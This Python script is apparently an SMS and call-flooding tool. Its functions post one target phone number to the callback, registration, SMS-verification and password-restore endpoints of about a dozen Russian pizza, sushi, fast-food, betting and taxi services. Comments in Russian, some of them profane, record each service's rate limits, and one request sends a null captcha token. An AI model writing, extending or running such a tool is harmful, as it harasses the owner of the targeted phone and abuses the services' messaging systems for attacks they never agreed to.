import requests
phone = '9992223456'


def pizzalarenzo(phone):
    headers = {
        'name': '%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
        'phone': '8'+phone,
        'time': ('%D0%91%D0%BB%D0%B8%D0%B6%D0%B0%D0%B9%D1%88%D0%B5%D0%B5+'
                 '%D0%B2%D1%80%D0%B5%D0%BC%D1%8F')
    }
    response_pizzalarenzo = requests.post(url='https://pizzalarenzo.ru/api/callback.php',
                                          headers=headers)
    print(response_pizzalarenzo)

def tarelochka(phone):
    headers = {
        'url': 'tarelochcka-2016%40yandex.ru',
        'name_1': '%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
        'phone_1': '8'+phone

    }
    response_tarelochka = requests.post(url='https://xn--80achdsmuvm0h.xn--p1ai/send/send_1.php',
                                        headers=headers)
    print(response_tarelochka)

def pizzapan(phone):
    headers = {
        'name': '%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
        'mytel': '8'+phone

    }
    response_pizzapan = requests.post(url='http://pizzapan.ru/send2.php',
                                      headers=headers)
    print(response_pizzapan)


def dostaevsky():
    dstvskphn = '+7 ' + phone[:3] + ' ' + phone[3:6] + '-' + phone[6:8] + '-' + phone[8:10]
    headers = {
        'phone': dstvskphn
    }
    response_dostaevsky = requests.post(url='https://msk.dostaevsky.ru/ajax/feedback/back_call.php',
                                        headers=headers)
    print(response_dostaevsky)


def pizzasushiwok(phone):
    headers = {
        'mod_name': 'call_me',
        'task': 'request_call',
        'name': '%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
        'phone': '8'+phone
    }
    response_pizzasushiwok = requests.post(url='https://pizzasushiwok.ru/', headers=headers)
    print(response_pizzasushiwok)


def ipizza():
    ipzzphn = '%2B7' + '+' + '(' + phone[:3] + ')' + '+' + phone[3:6] + '-' + phone[6:8] + '-'\
              + phone[8:10]
    headers = {
        'name': '%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
        'phone': ipzzphn
    }
    response_ipizza = requests.post(url='https://ipizza.ru/xml/api/callback/', headers=headers)
    print(response_ipizza)

# тут мне было впадлу сделать параметр, ес чо надо только номер подставить
def okeansushi(phone):
    oknsshphn = '8' + '+' + '(' + phone[:3] + ')' + '+' + phone[3:6] + '-' + phone[6:8] +\
                '-' + phone[8:10]
    response_okeansushi = requests.post(url=('https://okeansushi.ru/includes/contact.php?call_mail'
                                             '=1&ajax=1&name=%D0%93%D0%BE%D1%80%D0%B8%D0%B3%D0%BE%D'
                                             '1%80%D0%B8%D0%B5%D0%B9&phone=' + oknsshphn +
                                             '&call_time=1&call_time_dt%5B%5D=21&call_time_dt%5B%5D'
                                             '=45&pravila2=on'))
    print(response_okeansushi)

# тоже немного пидорский формат номера, fix me
def sunlight():
    snlghtphn = '7'+phone
    response_sunlight = requests.post(url='https://api.sunlight.net/v3/customers/authorization/',
                                      json={"phone": snlghtphn})
    print(response_sunlight)

# уебищное форматирование номера, fix me
# тут если слать чаще чем раз примерно в минуту - ту мэни реквестс, надо таймер на минуту ставить
def bk():
    bkphn = '+7' + ' ' + '(' + phone[:3] + ')' + ' ' + phone[3:6] + '-' + phone[6:8] +\
            '-' + phone[8:10]
    response_bk = requests.post(url='https://deliverysmart.burgerking.ru/account/session',
                                json={"phone": bkphn,
                                      "g-recaptcha-response": "null"})
    print(response_bk)

# ваще хз, надо тестить, но должно работать, сначала регает, потом ресторит пароль раз в 3 минуты
def olimpbet():
    olmpphn = '7'+phone
    response_olimpbet = requests.post(url='https://www.olimp.bet/api/smsregistration',
                                      json={"lang_id": "0", "platforma": "SITE_CUPIS",
                                            "cash": "3", "telnum": olmpphn,
                                            "email": "***@gmail.com",
                                            "tag": "c4bee55d6bb50e85287bffe8fd0113d5"})
    print(response_olimpbet)

    # вот ниже реквест с таймаутом в 3 минуты
    response_olimpbet = requests.post(url='https://www.olimp.bet/api/user/passrestore/',
                                      json={"lang_id": "0", "platforma": "SITE_CUPIS",
                                            "kind": "phone", "data": olmpphn})
    print(response_olimpbet)

#  тут какой-то таймаут, надо тестить, мне лень сейчас сидеть и засекать, вроде минута,
#  но оно как-то хз работает
def kfc():
    kfcphn = '+7'+phone
    response_kfc = requests.post(url=('https://app-api.kfc.ru/api/v1/'
                                      'common/auth/send-validation-sms'),
                                 json={"phone": kfcphn})
    print(response_kfc.content)

#  ваще без таймаута походу
def taxinonstop(phone):
    txnnstpphn = '8'+phone
    response_taxinonstop = requests.post(url='https://taxinonstop.ru/dist/backend/register.php',
                                         json={"cmd": "register", "phone": txnnstpphn,
                                               "taxi_city": "tmn"})
    print(response_taxinonstop)


#  pizzalarenzo(phone)
#  tarelochka(phone)
#  pizzapan(phone)
#  dostaevsky()
#  pizzasushiwok(phone)
#  ipizza()
#  sunlight()
#  bk()
#  olimpbet()
#  kfc()
#  taxinonstop(phone)
#  test commit
